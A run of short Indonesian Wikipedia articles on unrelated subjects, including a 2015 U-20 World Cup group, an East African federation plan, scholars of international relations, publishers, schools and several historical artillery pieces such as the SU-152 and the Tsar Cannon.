Grup F Piala Dunia U-20 FIFA 2015 terdiri dari Jerman, Fiji, , dan Honduras. Pertandingan akan berlangsung dari tanggal 1 Juni sampai 7 Juni 2015.

(H) adalah Tuan Rumah
? adalah belum diketahui.


</doc>
<doc id="1758165" url="https://id.wikipedia.org/wiki?curid=1758165" title="Yoon So-hee">
Yoon So-hee

Yoon So-hee (; lahir pada 7 Mei 1993) merupakan aktris dari Korea Selatan

Yoon So-hee lahir di Stuttgart, Jerman pada tanggal 7 Mei 1993. Pada tahun 2011, ia terdaftar sebagai mahasiswi Teknik Kimia dan Biomolekul di KAIST ("Korea Advanced Institute of Science and Technology"), salah satu universitas IPTEK terkemuka di Korea Selatan. Namun saat ini ia sedang mengambil cuti untuk kuliahnya.

Yoon pertama kali tampil pada "Hit the S Style", sebuah acara "variety show" yang menyorot bintang kampus. Ia kemudian muncul dalam video istirahat Super Show 5, sebuah acara konser Super Junior, diikuti dengan cameo dalam video musik SHINee,
"Why So Serious?".

Pada 2013, ia membintangi video musik EXO dalam "EXO Music Video Drama "(baik versi Korea maupun Mandarin). Setela itu, Yoon melakukan debut aktingnya pada drama "The Blade and Petal". Sejak saat itu, ia memerankan tokoh pada banyak drama, seperti" Let's Eat" "dan Wild Chives and Soy Bean Soup: 12 Years Reunion".

Yoon So Hee banyak bermain drama bersama Idol, contohnya saja pada tahun 2016 ia membintangi webdrama '"The Day After We Broke Up"' bersama L Infinite dan mereka kembali menjadi rekan kerja dalam drama hits MBC 2017 '"Ruler: Master Of The Mask"' sebagai Kim Hwa Gun"."



</doc>
<doc id="1758171" url="https://id.wikipedia.org/wiki?curid=1758171" title="Federasi Afrika Timur">
Federasi Afrika Timur

Federasi Afrika Timur (Swahili: "Shirikisho la Afrika Mashariki") adalah rencana penyatuan politik lima negara berdaulat dalam Komunitas Afrika TimurBurundi, Kenya, Rwanda, Tanzania, dan Ugandamenjadi satu negara federasi berdaulat. Per 2014, kelima negara ini telah menyatakan dukungannya terhadap penyatuan ini, tetapi persoalan kedaulatan anggota dan waktu pelaksanaannya masih dibahas lebih lanjut.

Dengan luas 1.820.664 km², Federasi Afrika Timur akan menjadi negara terbesar keempat di Afrika dan ke-17 di dunia. Dengan jumlah penduduk 153.301.178, Federasi Afrika Timur akan menjadi negara terpadat kedua di Afrika (setelah Nigeria) dan kesepuluh di dunia. Populasinya lebih besar daripada Rusia, Jepang, dan Meksiko, dan separuh populasi Amerika Serikat. Kepadatan penduduknya diperkirakan mencapai 84,2 jiwa/km².

Bahasa Swahili akan menjadi lingua franca, sedangkan bahasa Inggris akan menjadi bahasa resminya. Ibu kota federasi ini akan dditempatkan di Arusha, Tanzania, dekat perbatasan Kenya. Markas Komunitas Afrika Timur saat ini terletak di Arusha.

Rencananya, negara ini akan menggunakan mata uang shilling Afrika Timur dan diperkirakan menjadi mata uang utama kelima negara ini pada tahun 2015 atau seterusnya. PDB-PPP (versi CIA World Factbook) negara ini diperkirakan mencapai US$297.791.000.000, terbesar kelima di Afrika dan ke-48 di dunia. PDB per kapitanya sekitar US$1.942.

Penyatuan Komunitas Afrika Timur menjadi satu negara sudah dibahas sejak tahun 2013. Pada tahun 2010, EAC meluncurkan pasar umum untuk barang, tenaga kerja, dan modal di kawasan Afrika Timur. Penyatuan mata uang dijadwalkan rampung pada tahun 2013 dan penyatuan politik akan diselesaikan pada tahun 2015.

Sampai saat ini, pengaruh masuknya Sudan Selatan ke EAC terhadap rencana federasi masih belum jelas. Karena masalah infrastruktur terus bertahan di Sudan Selatan sejak Presiden Salva Kiir Mayardit menghentikan perdagangan minyak dengan Sudan, Sudan Selatan memutuskan untuk menanamkan modal dalam pembangunan jalur pipa yang mengitari Sudan. Pipa ini akan melintasi Ethiopia hingga pesisir Djibouti dan mengarah ke tenggara sampai pesisir Kenya. Kerja sama ini akan meningkatkan kemungkinan bergabungnya Sudan Selatan dengan Federasi Afrika Timur.

Pada tanggal 14 Oktober 2013, kepala negara Uganda, Kenya, Rwanda, dan Burundi bertemu di Kampala untuk merumuskan undang-undang dasar Federasi Afrika Timur.

Pada Desember 2014, upaya penyatuan politik secara menyeluruh diputuskan untuk ditunda hingga tahun 2016.



</doc>
<doc id="1758172" url="https://id.wikipedia.org/wiki?curid=1758172" title="Jonathan Sarfati">
Jonathan Sarfati

Jonathan D. Sarfati (Lahir 1 Oktober 1964) merupakan seorang kreationisme Bumi Muda dan anggota Atlet Catur Nasional New Zealand (1987–1988) Sarfati memiliki gelar PhD dalam bidang kimia dan bekerja untuk Creation Ministries International (CMI), Suatu lembaga non-profit di bagian departemen Christian Apologetics . Ia merupakan penulis buku dan artikel tentang pembuatan sains.

Lahir di Ararat, Victoria, Sarfati pindah bersama keluarganya ke New Zealand pada saat masih kanak kanak, dimana ia memperoleh Kewarganegaraan Ganda Australia dan New Zealand . dia berkuliah di Wellington College New Zealand, Setelah lulus dariUniversitas Victoria Wellington dengan gelar B.Sc. (Hons.) dalam bidang kimia, dan gelar Ph.D. dalam subjek yang sama dengan Disertasi berjudul "A Spectroscopy Study of some Chalcogenide Ring and Cage Molecules". Ia juga merupakan penulis(sebagai co -author) sebuah jurnal ilmiah yang berjudul high-temperature superconductor Yang dipublikasikan di dalam "Nature" tahun 1987 ("Letters to Nature"), Thermoelectric power and electron-phonon enhancement in YBa dan dari tahun 1988 hingga 1995, ia juga menulis Jurnal Ilmiah yang berjudul spectroscopy of condensed matter.

Tahun 1996, Ia kembali ke Brisbane, Australia untuk bekerja di Creation Science Foundation, Lalu menjawab dalam Genesis dan sekarang sebagai minister Creation International, dan bekerja sebagai wakil editor majalah tersebut, "Creation", dan jurnal teknik mereka, "Journal tentang Penciptaan" (dikenal dengan "TJ").





</doc>
<doc id="1758174" url="https://id.wikipedia.org/wiki?curid=1758174" title="Daftar Ketua Menteri Meghalaya">
Daftar Ketua Menteri Meghalaya

Ketua Menteri Meghalaya adalah ketua eksekutif dari negara bagian timur laut India Meghalaya. Sesuai dengan Konstitusi India, gubernur adalah seorang kepala "de jure" negara bagian, tetapi otoritas eksekutif "de facto" dipegang ketua menteri. Setelah pemilihan-pemilihan dari Mahkamah Legislatif Meghalaya, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Sejak 1970, sebelas orang telah menjabat sebagai Ketua Menteri Meghalaya. Enam diantaranya berasal dari Kongres Nasional India, termasuk pemegang jabatan pertama Williamson A. Sangma dan petahana saat ini Mukul Sangma, yang menjabat sejak 20 April 2010.




</doc>
<doc id="1758175" url="https://id.wikipedia.org/wiki?curid=1758175" title="Konser Demokrasi">
Konser Demokrasi

Konser Demokrasi () atau Liga Demokrasi adalah organisasi internasional alternatif yang digagas oleh Ivo Daalder dan James Lindsay dalam opini editorial di Washington Post pada bulan Mei 2004. Konsep ini lebih luas daripada organisasi militer sehingga dipilihlah kata "konser", bukan "aliansi". Dalam artikel sambungannya di "The American Interest", mereka menyebutkan bahwa sekitar 60 negara layak menjadi anggota organisasi ini. John Ikenberry dan Anne-Marie Slaughter juga pernah mengusulkan pembentukan “"Concert of Democracies"” dalam laporan akhir Princeton Project berjudul "National Security, Forging a World Under Liberty and Law: U.S. National Security in the 21st Century" pada September 2006. Konsep ini mendapat dukungan dari mantan calon presiden Amerika Serikat John McCain.

Menurut laporan akhir Princeton Project yang dirilis tanggal 7 September 2006, organisasi alternatif ini bertujuan memperkuat kerja sama keamanan di antara negara-negara demokrasi liberal dan menyusun kerangka kerja untuk menyelesaikan permasalahan yang dihadapi bersama; idealnya di dalam lembaga regional dan global yang sudah ada, namun apabila lembaga tersebut gagal melakukannya, organisasi ini secara independen akan berfungsi sebagai lembaga yang berusaha memperkuat kebebasan sesuai aturan di seluruh dunia. Organisasi ini akan menjadi gambaran dan contoh pelaksanaan "perdamaian demokratis" di tingkat institusi.

Pada tanggal 16 September 2006, Anne Bayefsky dari Hudson Institute mengusulkan pembentukan organisasi bernama United Democratic Nations dalam artikelnya di "The Jerusalem Post". Tidak seperti peneliti Princeton Project, Bayefsky dan peneliti konservatif lainnya memandang organisasi tersebut sebagai pengganti PBB yang dianggap tidak sah dan kurang efektif.

Para ilmuwan politik berpendapat bahwa kriteria penerimaan anggota dalam Konser Demokrasi tidak mudah. Faktor utama yang menjadi pertimbangan keanggotaan adalah adanya pemilihan umum yang rutin, kompetitif, bebas, dan adil, perlindungan hak asasi manusia, dan penegakan hukum. Pemikir progresif seperti Richard Falk dan Daniele Archibugi berpendapat bahwa tujuan akhir ini lebih mudah dicapai melalui reformasi Perserikatan Bangsa-Bangsa.




</doc>
<doc id="1758176" url="https://id.wikipedia.org/wiki?curid=1758176" title="John Ikenberry">
John Ikenberry

Gilford John Ikenberry (5 Oktober 1954) adalah teoriwan hubungan internasional dan kebijakan luar negeri Amerika Serikat. Ia merupakan dosen politik dan hubungan internasional di Woodrow Wilson School of Public and International Affairs, Universitas Princeton.

Setelah mendapatkan gelar BA dari Universitas Manchester, Indiana, dan PhD dari Universitas Chicago tahun 1985, Ikenberry menjadi dosen pembantu di Princeton sampai tahun 1992. Ia kemudian pindah ke Universitas Pennsylvania dan mengajar di sana sejak 1993 sampai 1999, lalu menjadi direktur Lauder Institute pada tahun 1994 sampai 1998. Tahun 2001, ia menjabat sebagai Dosen Geopolitik dan Keadilan Global Peter F. Krogh di Edmund A. Walsh School of Foreign Service, Universitas Georgetown. Ia kembali ke Princeton tahun 2004 setelah direkrut oleh dekan Anne-Marie Slaughter dan menjadi Dosen Politik dan Hubungan Internasional Albert G. Milbank di Woodrow Wilson School of Public and International Affairs, Princeton. Ikenberry juga menjabat sebagai Global Eminence Scholar di Universitas Kyung Hee, Seoul, Korea Selatan. Pada tahun 2013-2014, Ikenberry menjadi Dosen Tamu Eastman ke-7 di Balliol College, Oxford.

Ikenberry menjabat sebagai staf perencanaan kebijakan Departemen Luar Negeri Amerika Serikat sejak tahun 1991 sampai 1992. Ia juga menjabat sebagai peneliti senior di Carnegie Endowment for International Peace pada tahun 1992 sampai 1993, anggota Woodrow Wilson International Center for Scholars pada tahun 1998 sampai 1999, dan peneliti senior tak tetap di Brookings Institution tahun 1997 sampai 2002. Ia terlibat dalam beberapa proyek milik Council on Foreign Relations.

Ikenberry merupakan penulis buku-buku berikut:
Ia juga ikut menulis atau menyunting buku-buku berikut:
Ikenberry telah menerbitkan artikel di berbagai jurnal ilmiah kebijakan luar negeri dan hubungan internasional dan sering menulis artikel di Foreign Affairs.




</doc>
<doc id="1758177" url="https://id.wikipedia.org/wiki?curid=1758177" title="Anne-Marie Slaughter">
Anne-Marie Slaughter

Anne-Marie Slaughter (lahir 27 September 1958) adalah Presiden dan CEO New America Foundation. Ia sebelumnya menjabat sebagai Dosen Politik dan Hubungan Internasional Bert G. Kerstetter di Universitas Princeton dan Dekan Woodrow Wilson School of Public and International Affairs. Ia merupakan seorang ilmuwan, analis kebijakan luar negeri, dan komentator publik. Ia menjabat sebagai Direktur Perencanaan Kebijakan Departemen Luar Negeri Amerika Serikat sejak Januari 2009 sampai Februari 2011 di bawah kepemimpinan Menteri Luar Negeri Hillary Clinton. Ia merupakan pengacara internasional dan ilmuwan politik yang sempat berkarier di Universitas Chicago dan Universitas Harvard serta mantan presiden American Society of International Law.




</doc>
<doc id="1758178" url="https://id.wikipedia.org/wiki?curid=1758178" title="Daniele Archibugi">
Daniele Archibugi

Daniele Archibugi adalah ekonom dan teoriwan politik Italia. Ia menulis beberapa buku mengenai ekonomi dan kebijakan inovasi dan perubahan teknologi, teori politik hubungan internasional, dan globalisasi politik dan teknologi.

Bersama David Held, ia menjadi tokoh utama kosmopolitanisme dan demokrasi kosmopolitan dan dikenal atas upayanya untuk menerapkan sejumlah norma dan nilai demokrasi pada politik global. Ia mengusulkan reformasi organisasi internasional seperti Perserikatan Bangsa-Bangsa dan Uni Eropa secara besar-besaran.

Ia menyebut KTT G7, G8, dan G20 tidak demokratis dan menuntut perkumpulan politik global yang lebih transparan. Ia juga menolak konsep Konser Demokrasi karena tujuannya lebih efektif diraih melalui reformasi demokrasi PBB. Archibugi merupakan salah satu pendukung Parlemen Dunia yang anggota-anggotanya dipilih secara langsung.





</doc>
<doc id="1758180" url="https://id.wikipedia.org/wiki?curid=1758180" title="Richard A. Falk">
Richard A. Falk

Richard Anderson Falk (lahir 13 November 1930) adalah dosen emeritus hukum internasional di Universitas Princeton, Amerika Serikat. Ia merupakan penulis 20 buku dan penyunting 20 volume buku lainnya. Pada tahun 2008, Dewan Hak Asasi Manusia Perserikatan Bangsa-Bangsa (UNHRC) menunjuk sebagai Pelapor Khusus Perserikatan Bangsa-Bangsa di bidang "situasi hak asasi manusia di wilayah Palestina yang diduduki sejak 1967." Ia pernah dikriik oleh duta besar Amerika Serikat untuk PBB Susan Rice dan Sekretaris Jenderal Perserikatan Bangsa-Bangsa Ban Ki-moon atas pandangannya mengenai Israel dan serangan 11 September.




</doc>
<doc id="1758181" url="https://id.wikipedia.org/wiki?curid=1758181" title="Miki Nonaka">
Miki Nonaka

Nonaka Miki lahir pada tanggal 7 Oktober 1999, di Shizuoka, Jepang. Karena pekerjaan ayahnya, dia tinggal di Amerika Serikat selama delapan tahun. Dia tinggal di negara bagian Illinois dari 2001 hingga 2004 dan di negara bagian Alabama dari tahun 2004 sampai 2010.

Di musim panas 2014, Nonaka mengikuti audisi "Morning Musume '14 (Golden) Audition!" untuk kesempatan bergabung Morning Musume dan berhasil lulus. Pada 30 September 2014, ia diperkenalkan sebagai anggota generasi ke-12 dalam konser Morning Musume di Nippon Budokan, bersama dengan Haruna Ogata, Maria Makino dan Akane Haga.

Mulai tanggal 4 Januari 2015 Nonaka bersama anggota generasi ke 12 mendapatkan slot acara radio di radio FM FUJI yang berjudul "Morning Musume '15 12ki Nikki!", yang mengudara setiap hari Minggu pukul 16:30~16:53 JST. Nonaka membuat debut resminya pada singel ke 58 Morning Musume "Seishun Kozo ga Naiteiru / Yuugure wa Ameagari / Ima Koko Kara", yang dirilis 15 April 2015.








</doc>
<doc id="1758183" url="https://id.wikipedia.org/wiki?curid=1758183" title="Shivraj Singh Chouhan">
Shivraj Singh Chouhan

Shivraj Singh Chouhan (kelahiran 5 Maret 1959) adalah Ketua Menteri Madhya Pradesh ke-18 dan saat ini, sebuah negara bagian India tengah. Ia menggantikan Babulal Gaur sebagai ketua menteri pada 29 November 2005. Sebagai pemimpin Partai Bharatiya Janata, ia menjabat sebagai sekretaris jenderalnya dan presiden dari unit negara bagian Madhya Pradesh-nya. Ia bergabung dengan RSS pada 1972, ketika berusia 13 tahun. Ia lima kali menjadi Anggota Parlemen, mewakili Vidisha di Lok Sabha sejak 1991. Saat ini, ia mewakili konstituensi Budhni, sebuah tempat tehsil di distrik Sehore, dalam mahkamah Madhya Pradesh.
Pada 2007, ia mengenalkan skema-skema yang dinamai "Ladli Laxmi Yojna","Kanyadhan Yojna" dan "Janani Suraksha Yojna" yang berfokus pada prevensi infantisida perempuan di negara bagian tersebut.

Shivraj Singh Chouhan lahir dalam keluarga Prem Singh Chouhan dan istrinya Sundar Bai Chouhan di desa Jait di distrik Sehore. Masuk ke komunitas Kirar Rajput, ia menjadi peraih medali emas dalam M. A. (Filsafat) dari Universitas Barkatullah, Bhopal.

Ia terpilih menjadi Presiden Serikat Pelajar Sekolah Model pada 1975.



</doc>
<doc id="1758185" url="https://id.wikipedia.org/wiki?curid=1758185" title="Pelapor Khusus Perserikatan Bangsa-Bangsa">
Pelapor Khusus Perserikatan Bangsa-Bangsa

Pelapor Khusus, Perwakilan Khusus Sekretaris Jenderal, dan Pakar Independen adalah gelar yang diberikan kepada orang-orang yang bekerja atas nama Perserikatan Bangsa-Bangsa (PBB) dalam lingkup mekanisme "Prosedur Khusus". Orang-orang ini membawa mandat dari Dewan Hak Asasi Manusia Perserikatan Bangsa-Bangsa, baik itu mandat negara atau mandat bertema. "Rapporteur" merupakan kata berbahasa Prancis yang digunakan untuk menyebut seorang penyelidik yang tunduk di bawah lembaga berwenang.
Mandat PBB adalah "menyelidiki, mengawasi, menyarankan, dan melaporkan secara terbuka" permasalahan hak asasi manusia melalui "aktivitas yang dilakukan sesuai prosedur khusus, termasuk menanggapi keluhan perorangan, operasi dan manipulasi psikologis melalui media dan pendidikan yang terkontrol, melakukan penelitian, memberi saran mengenai kerja sama teknis di tingkat negara, dan terlibat dalam aktivitas promosi terbuka." Buku panduan "Internal Advisory Procedure to Review Practices and Working Methods" yang diterbitkan Coordination Committee of Special Procedures tanggal 25 Juni 2008 menyebut para pelapor ini "pemegang mandat". Mandat ini juga dilaksanakan oleh "Perwakilan Khusus Sekretaris Jenderal", "Pakar Independen", atau kelompok kerja yang beranggotakan lima orang (satu orang mewakili satu kawasan di dunia).

Saat ini terdapat 37 Pelapor Khusus, Perwakilan Khusus, dan Pakar Independen yang mengemban tugas sesuai mandat negara dan mandat bertemanya masing-masing:






</doc>
<doc id="1758187" url="https://id.wikipedia.org/wiki?curid=1758187" title="Routledge">
Routledge

Routledge () adalah penerbit multinasional Britania Raya. Perusahaan ini didirikan tahun 1836 oleh George Routledge dan menyediakan buku akademik, jurnal ilmiah, dan sumber referensi daring di bidang humaniora dan sains. Perusahaan ini menerbitkan 1.800 jurnal dan 2.000 buku baru setiap tahunnya dan portofolionya mencapai lebih dari 35.000 judul.

Pada tahun 1998, Routledge menjadi anak perusahaan dan imprin pesaing lamanya, Taylor & Francis Group, setelah diakuisisi dari Cinven dengan nilai £90 juta. Cinven sebelumnya mengakuisisi Routledge dengan nilai £25 juta.

Taylor and Francis menutup divisi ensiklopedia Routledge pada tahun 2006. Beberapa terbitannya adalah:

Buku-buku ensiklopedia Europa Publications yang diterbitkan Routledge:




</doc>
<doc id="1758190" url="https://id.wikipedia.org/wiki?curid=1758190" title="Princeton University Press">
Princeton University Press

Princeton University Press adalah penerbit independen yang memiliki kaitan dengan Universitas Princeton. Misinya adalah membebaskan pengetahuan di lingkup akademik dan masyarakat luas.

Pers ini didirikan oleh Whitney Darrow dengan bantuan dana dari Charles Scribner pada tahun 1905 sebagai pers cetak yang melayani Princeton. Buku pertamanya adalah "Lectures on Moral Philosophy" karya John Witherspoon edisi tahun 1912.

Enam buku terbitan Princeton University Press memenangi Hadiah Pulitzer.

Buku-buku terbitan Princeton University Press juga dianugerahi Bancroft Prize, Nautilus Book Award, dan National Book Award.

Proyek dokumen bersejarah multivolume yang diterbitkan oleh Princeton meliputi:

"The Papers of Woodrow Wilson" disebut sebagai "salah satu prestasi editorial terbesar sepanjang sejarah."





</doc>
<doc id="1758196" url="https://id.wikipedia.org/wiki?curid=1758196" title="SMA Negeri 2 Mranggen">
SMA Negeri 2 Mranggen

Deskripsi
SMA N 2 Mranggen, merupakan salah satu Sekolah Menengah Atas Negeri yang ada di Provinsi Jawa Tengah, yang beralamat di Jalan Pucang Peni Raya, Mranggen, Kabupaten Demak. Sama dengan SMA pada umumnya di Indonesia masa pendidikan sekolah di SMAN 2 Mranggen ditempuh dalam waktu tiga tahun pelajaran, mulai dari Kelas X sampai Kelas XII.
SMAN 2 Mranggen.





</doc>
<doc id="1758206" url="https://id.wikipedia.org/wiki?curid=1758206" title="M115 howitzer">
M115 howitzer

M115 203 mm howitzer, juga dikenal sebagai M115 8 inci howitzer, adalah howitzer tarik digunakan oleh Angkatan Darat Amerika Serikat. Sampai tahun 1950-an itu dinamakan 8 inci Howitzer M1. Desain asli mulai tahun 1919 namun dibangkitkan pada tahun 1927 sebagai mitra-piece untuk senjata baru 155 mm.

Senjata itu merupakan senjata standar sebagai 8 inci Howitzer M1 pada tahun 1940. M115/M1 ditarik oleh traktor gun M35 Prime Mover atau truk Mack 7 1/3 ton 6x6.



</doc>
<doc id="1758207" url="https://id.wikipedia.org/wiki?curid=1758207" title="6-inch field howitzer M-1908">
6-inch field howitzer M-1908

6 inch Field Howitzer, Model 1908 adalah howitzer berat standar Amerika sebelum Perang Dunia I. Sekitar seratus senjata ini telah diproduksi sebelum tahun 1917 dan semua yang bekerja untuk pelatihan di Amerika Serikat. Untuk penggunaan tempur di Prancis Canon de 155 C MLE 1917 Schneider telah dibeli.

Semua senjata yang masih hidup sudah pensiun selama tahun 1920-an.

Senjata ini adalah unik di antara senjata artileri Amerika dalam hal silinder mundur terletak di atas laras.


</doc>
<doc id="1758211" url="https://id.wikipedia.org/wiki?curid=1758211" title="Freedom Group">
Freedom Group

Freedom Group adalah sebuah perusahaan produsen senjata api Amerika yang telah mengakuisisi merek terkemuka seperti Bushmaster, DPMS, dan Remington Arms.




</doc>
<doc id="1758212" url="https://id.wikipedia.org/wiki?curid=1758212" title="Bushmaster Firearms International">
Bushmaster Firearms International

Bushmaster Firearms International, LLC, yang berbasis di Madison, North Carolina, Amerika Serikat, adalah produsen dan distributor senjata api. Lini produk perusahaan berkisar pistol dan senapan varian semi-otomatis dari desain M4 / AR-15.



</doc>
<doc id="1758213" url="https://id.wikipedia.org/wiki?curid=1758213" title="Locusta migratoria">
Locusta migratoria

Belalang kembara ("Locusta migratoria") adalah jenis belalang besar yang paling tersebar di dunia, dan merupakan satu-satunya spesies anggota marga "Locusta". Serangga hama ini dapat dijumpai di seluruh Dunia Lama yang beriklim agak hangat, mulai dari Afrika, Asia, Australia, sampai Selandia Baru. Dulu banyak ditemukan di Eropa namun sekarang jarang. Terdapat banyak anakjenis dikenal karena persebarannya yang luas.


</doc>
<doc id="1758215" url="https://id.wikipedia.org/wiki?curid=1758215" title="Hummel (kendaraan)">
Hummel (kendaraan)

Hummel (Jerman: "bumblebee") adalah senjata artileri self-propelled berdasarkan chassis Geschützwagen III/IV dan dipersenjatai dengan howitzer 15 cm. Itu digunakan oleh Jerman Wehrmacht selama Perang Dunia Kedua dari awal tahun 1943 sampai akhir perang.

Nama lengkap kendaraan itu "Panzerfeldhaubitze 18M auf Geschützwagen III/IV (Sf) Hummel, Sd.Kfz. 165". Pada tanggal 27 Februari 1944, Hitler memerintahkan nama Hummel akan turun seperti itu tidak pantas untuk kendaraan tempur.



</doc>
<doc id="1758218" url="https://id.wikipedia.org/wiki?curid=1758218" title="SU-152">
SU-152

SU-152 (СУ-152) adalah Howitzer Berat Swa-gerak buatan Uni Soviet yang digunakan selama Perang Dunia II.

Pada bulan November 1942, Komite Pertahanan Negara Uni Soviet memerintahkan pembuatan meriam swa-gerak dengan meriam howitzer 152 mm ML-20. Pada bulan Desember 1942, terdapat 3 desain dari para insinyur artileri dan pabrik tank Soviet, desain Zhozef Kotin yang terpilih untuk produksi massal karena berhasil menggabungkan sasis KV-1S dengan meriam howitzer ML-20 dengan sedikit biaya.

Proyek ini dikenal dengan proyek "KV-14" dan purwarupa pertamanya disebut "Obyekt 236", setelah berhasil melalui beragam uji coba selama 2 bulan, meriam swa-gerak ini masuk tahap diproduksi massal di pabrik "Chelyabinskiy Kirovskiy Zavod." Desain seri meriam swa-gerak ini diubah dari KV-14 menjadi SU-152 dengan meriam howitzer ML-20 yang sedikit dimodifikasi demi kenyamanan kru.

Karena meriam howitzernya yang berkekuatan besar maka SU-152 juga bisa digunakan sebagai penghancur tank berat, meriam howitzernya mampu menembus tank Jerman Panzer VI Tiger dan Panzer V Panther, dan tank penghancur Elefant, oleh karena itu SU-152 dijuluki Zveroboy ("Pembasmi Binatang Buas"). Karena kekurangan senapan mesin dan kesusahan dalam pertempuran urban ataupun jarak dekat maka SU-152 dilengkapi dengan senapan mesin anti-pesawat DShK berkaliber 12.7 mm pada musim panas 1943.

SU-152 merupakan anggota terakhir dari keluarga tank KV yang diproduksi massal, karena howitzer swa-gerak ini akan digantikan dengan ISU-152 yaitu howitzer berat swa-gerak yang menggunakan sasis tank IS.




</doc>
<doc id="1758220" url="https://id.wikipedia.org/wiki?curid=1758220" title="KBIT Ar Raihan">
KBIT Ar Raihan

KBIT Ar Raihan atau Kelompok Bermain Islam Terpadu Ar Raihan adalah lembaga pendidikan anak usah dini (usia 4-5 tahun) yang diselenggarakan oleh Yayasan Ar Raihan. KBIT Ar Raihan beralamat di Jln. Ir. H. Juanda 58, Kecamatan Bantul, Kabupaten Bantul, Provinsi Daerah Istimewa Yogyakarta, Indonesia.




</doc>
<doc id="1758221" url="https://id.wikipedia.org/wiki?curid=1758221" title="TPA Ar Raihan">
TPA Ar Raihan

TPA Ar Raihan atau Taman Pengasuhan Anak Ar Raihan adalah lembaga pendidikan untuk anak usia dini (usia 2-3 tahun) yang diselenggarakan oleh Yayasan Ar Raihan. Lembaga ini beralamat di Dusun Mandingan, Kelurahan Ringinharjo, Kecamatan Bantul, Kabupaten Bantul, Provinsi Daerah Istimewa Yogyakarta, Indonesia.




</doc>
<doc id="1758226" url="https://id.wikipedia.org/wiki?curid=1758226" title="Kampung Padang Mungka">
Kampung Padang Mungka

Padang Mungka adalah merupakan sebuah kampung yang terletak di kecamatan Mungka, Kabupaten Lima Puluh Kota, provinsi Sumatra Barat, Indonesia. Kampung Padang Mungka berada tidak jauh dari Kota Payakumbuh (sekitar 15 kilometer) dan selain banyak memiliki sejarah kampung ini juga sangat terkenal dengan "ayam merah" yang sangat banyak warganya yang memiliki ayam merah tersebut.

Nama "Kampung Padang Mungka" awalnya ialah "Padang harapan", yang artinya adalah merupakan sebuah kampung yang diharapkan bisa mengenalkan budaya yang ada ke mancan negara, dan kampung yang berada di budaya Minangkabau ini juga sangat banyak memiliki ulama yang sangat banyak dikenal oleh banyak orang.


Sekolah di kampung ini antara lain:



</doc>
<doc id="1758237" url="https://id.wikipedia.org/wiki?curid=1758237" title="Mallet's Mortar">
Mallet's Mortar

Mallet's Mortar adalah mortir shell tembak Inggris dibangun untuk Perang Krimea, tetapi tidak pernah digunakan dalam pertempuran.

Mortar ini dirancang oleh Robert Mallet. Ini dibangun dalam beberapa bagian sehingga dapat diangkut.

Robert Mallet pertama mempublikasikan desain di 1854. Ada respon sedikit dari otoritas sampai Mallet menulis kepada Prime Minister Lord Palmerston pada Maret 1855. Palmerston mengambil ide dan menginstruksikan Dewan Ordnance mengatur untuk pembangunan dua mortir desain Mallet ini.

Thames Ironworks dan Shipbuilding Company memenangkan kontrak dengan harga £ 4.300 per mortar. Kebangkrutan perusahaan mengakibatkan pekerjaan yang dibagi antara tiga perusahaan yang berhasil mengirimkan mortir Mei 1857.

Pengujian dimulai pada 19 Oktober 1857 dengan pengujian lebih lanjut pada tanggal 18 Desember 1857, 21 Juli 1858 dan 28 Juli 1858. Setiap uji diakhiri oleh kerusakan mortir. Sebanyak 19 ditembakkan dengan laju sekitar 4 peluru tiap jam.

Berat peluru adalah antara 2.352 dan £ 2.940 (1.067 dan 1.334 kg). Dalam pengujian dengan biaya £ 80 itu menembakkan peluru dengan jarak 2.759 yard (2.523 m) dengan waktu penerbangan dari 23 detik.

Kedua mortir berada di koleksi Royal Armouries, museum of arms and armour nasional Inggris.

Senjata yang digunakan untuk pengujian dipinjamkan ke Royal Artillery dan terletak di Repository Road, sebaliknya pangkalan militer di Woolwich, sementara senjata tanpa tembakan dipamerkan di Royal Armouries Fort Nelson dekat Portsmouth.



</doc>
<doc id="1758246" url="https://id.wikipedia.org/wiki?curid=1758246" title="Little David">
Little David

Little David adalah julukan dari mortar Amerika kaliber 36 inci (910 mm) digunakan untuk tes menembak bom udara selama Perang Dunia II, yang merupakan salah satu senjata kaliber terbesar yang pernah dibangun, memiliki kaliber lebih besar dari senjata api Dora Jerman dan Gustav yang adalah 31,5 inci (800 mm). Mallet's Mortar Inggris memiliki kaliber yang sama.

Senjata ini adalah hasil uji coba dari Amerika Serikat, pada perang dunia, bentuknya sangat sederhana dibandingan dengan "Syerer Gustav" atau "Carl". Namun senjata ini masih memegang rekor senjata terbesar dengan kaliber 914 mm atau 36 inci di antara senjata artileri modern lainnya.

Mortir Little David ini masih memegang rekor untuk kaliber besar 914mm atau 36 inci antara semua senjata artileri modern.

Little David adalah salah satu artileri terbesar yang pernah diproduksi, oleh kaliber, meskipun Dora menembakkan shell lebih berat. Keefektifan akan dipertanyakan karena jangkauan dan akurasi terbatas. Ketika Jepang menyerah, dan Little David (masih dalam tahap uji coba) tidak pernah melibat dalam pertempuran.

Little David saat ini berada dalam koleksi luar museum armor dan artileri di Aberdeen Proving Grounds di Maryland.



</doc>
<doc id="1758248" url="https://id.wikipedia.org/wiki?curid=1758248" title="Meriam Tsar">
Meriam Tsar

Tsar Cannon (Rusia: Царь-пушка, Tsar'-Pushka) adalah meriam panjang besar, 5,94 meter (19,5 kaki) pada tampilan di dasar Kremlin Moskow.

Meriam itu dibuat pada 1586 di Moskow, oleh master kastor perunggu Rusia Andrey Chokhov. Sebagian dari dampak simbolik, meriam itu tidak pernah digunakan dalam perang. Namun meriam setidaknya satu tembakan. Menurut Guinness Book of Records meriam itu merupakan bombardir dengan kaliber terbesar di dunia, dan itu merupakan daya tarik wisata utama dari Kremlin Moskow.

Meriam ini tiba di lini depan pada musim panas 1916 dan meluncurkan rangkaian tembakan pertamanya dengan penuh amarah pada 19 Juni. Satu tembakan tertuju langsung pada sebuah bunker Jerman, melontarkan bunker tersebut beberapa meter ke udara dan menjadikannya puing-puing. Pada musim dingin 1916, sebuah divisi meriam ini juga beraksi di dekat Riga, mengubah lokasi penembakan Jerman dan sarang-sarang meriam mesin mereka menjadi kawah-kawah menganga dengan beberapa tembakan yang tepat sasaran. Infanteri Rusia pun tidak menghadapi perlawanan ketika menguasai posisi musuh yang telah dibangun selama 18 bulan.

